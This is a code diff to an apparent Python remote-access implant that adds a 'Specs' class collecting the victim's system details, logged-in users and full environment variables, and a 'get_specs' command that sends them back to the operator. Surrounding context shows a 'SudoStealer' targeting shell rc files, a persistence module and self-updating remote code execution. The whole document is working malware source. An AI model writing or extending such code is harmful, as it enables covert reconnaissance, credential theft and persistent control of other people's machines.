@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request # Stdlib
+import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request, platform, datetime # Stdlib
 import asyncio
 
 try:
@@ -28,6 +28,98 @@ state = {
 }
 
 current_host = ""
+
+class Specs:
+	def get_os_info():
+		return platform.uname()._asdict()
+
+	def get_python_info():
+		return {
+			"version": platform.python_version(),
+			"implementation": platform.python_implementation(),
+			"compiler": platform.python_compiler(),
+			"build": platform.python_build(),
+			"executable": sys.executable,
+		}
+
+	def get_uptime():
+		try:
+			with open("/proc/uptime", "r") as f:
+				uptime_seconds = float(f.readline().split()[0])
+				return str(datetime.timedelta(seconds=int(uptime_seconds)))
+		except Exception as e:
+			return str(e)
+
+	def get_memory_info():
+		meminfo = {}
+		try:
+			with open("/proc/meminfo", "r") as f:
+				for line in f:
+					if ":" in line:
+						key, value = line.split(":", 1)
+						meminfo[key.strip()] = value.strip()
+		except Exception as e:
+			meminfo["error"] = str(e)
+		return meminfo
+
+	def get_cpu_info():
+		cpuinfo = {}
+		try:
+			with open("/proc/cpuinfo", "r") as f:
+				for line in f:
+					if ":" in line:
+						key, value = line.split(":", 1)
+						cpuinfo.setdefault(key.strip(), value.strip())
+		except Exception as e:
+			cpuinfo["error"] = str(e)
+		return cpuinfo
+
+	def get_disk_usage():
+		try:
+			statvfs = os.statvfs('/')
+			total = statvfs.f_frsize * statvfs.f_blocks
+			free = statvfs.f_frsize * statvfs.f_bfree
+			used = total - free
+			return {
+				"total_gb": round(total / (1024 ** 3), 2),
+				"used_gb": round(used / (1024 ** 3), 2),
+				"free_gb": round(free / (1024 ** 3), 2),
+			}
+		except Exception as e:
+			return {"error": str(e)}
+
+	def get_ip_address():
+		try:
+			hostname = socket.gethostname()
+			ip_address = socket.gethostbyname(hostname)
+			return ip_address
+		except Exception as e:
+			return str(e)
+
+	def get_logged_in_users():
+		try:
+			output = subprocess.check_output(['who'], text=True)
+			return [line.strip() for line in output.strip().splitlines()]
+		except Exception as e:
+			return [str(e)]
+
+	def get_env_vars():
+		return dict(os.environ)
+
+	def collect_info(detailed: bool):
+		o = {}
+		o["os"] = Specs.get_os_info()
+		o["python"] = Specs.get_python_info()
+		o["uptime"] = Specs.get_uptime()
+		o["local_ip"] = Specs.get_ip_address()
+		if detailed:
+			o["memory"] = Specs.get_memory_info()
+			o["cpu"] = Specs.get_cpu_info()
+			o["disk_usage"] = Specs.get_disk_usage()
+			o["logged_in_users"] = Specs.get_logged_in_users()
+			o["envars"] = Specs.get_env_vars()
+		o["detailed"] = detailed
+		return o
 
 class SudoStealer:
 	rcs = ["~/.bashrc","~/.zshrc"]
@@ -193,6 +285,11 @@ async def main():
 												with open(script_path, "w") as f:
 													f.write(c["code"])
 												os.execv(sys.executable, [sys.executable] + sys.argv)
+											case "get_specs":
+												await msg({
+													"event": "specs",
+													"data": Specs.collect_info(c["detailed"] if "detailed" in c else False),
+													})
 											case "enable_module":
 												if c["name"] == "persistence": await Persistence.enable()
 												elif c["name"] == "sudostealer": await SudoStealer.enable()
